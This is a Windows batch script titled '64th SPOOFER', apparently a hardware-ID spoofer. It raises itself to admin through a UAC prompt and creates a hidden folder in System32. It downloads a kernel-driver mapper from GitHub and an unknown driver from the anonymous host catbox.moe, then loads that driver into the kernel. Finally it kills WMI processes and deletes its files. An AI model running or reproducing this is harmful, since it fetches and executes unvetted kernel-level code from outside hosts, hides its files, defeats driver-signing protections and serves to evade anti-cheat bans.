@echo off
:: BatchGotAdmin
:-------------------------------------
REM  --> Check for permissions
IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
    >nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
    >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else (
    goto gotAdmin
)

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params=%*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"

:: Set target directory to C:\Windows\System32
set "targetDir=C:\Windows\System32\CSCv206"
if not exist "%targetDir%" (
    mkdir "%targetDir%"
    attrib +h "%targetDir%"  :: Hide the directory
)

:: Download mapper.exe
if not exist "%targetDir%\mapper.exe" (
    echo Downloading mapper.exe...
    powershell -Command "Invoke-WebRequest -Uri 'https://github.com/topking91154/64mapper/raw/refs/heads/main/64mapper.exe' -OutFile '%targetDir%\mapper.exe'"
    if not exist "%targetDir%\mapper.exe" (
        color b
        echo Failed to download mapper.exe. Please check your internet connection.
        pause
        goto end
    )
    attrib +h "%targetDir%\mapper.exe"  :: Hide the file
)

:: Download driver
set "driverPath=%targetDir%\paid_driv.sys"
if not exist "%driverPath%" (
    echo Downloading driver...
    powershell -Command "Invoke-WebRequest -Uri 'https://files.catbox.moe/i2vo58.sys' -OutFile '%driverPath%'"
    if not exist "%driverPath%" (
        color b
        echo Failed to download driver. Please check your internet connection.
        pause
        goto end
    )
    attrib +h "%driverPath%"  :: Hide the file
)

goto spoof

:spoof
title 64th SPOOFER.
echo spoofing..

"%targetDir%\mapper.exe" -- "%driverPath%"
if errorlevel 1 (
    color b
    echo Failed to load driver. Ensure the driver is compatible and properly signed.
    pause
    goto cleanup
)

echo done!
goto endsuccess

:endsuccess
taskkill /im wmiprv* /f /t 2>nul>nul
REM this is annoying wmic caches.
taskkill /im wmiprv* /f /t 2>nul>nul
pause
goto cleanup

:cleanup
:: Delete files after spoofing
if exist "%targetDir%\mapper.exe" (
    del "%targetDir%\mapper.exe"
)
if exist "%driverPath%" (
    del "%driverPath%"
)
if exist "%targetDir%" (
    rd "%targetDir%"
)
goto end

:end
exit /B
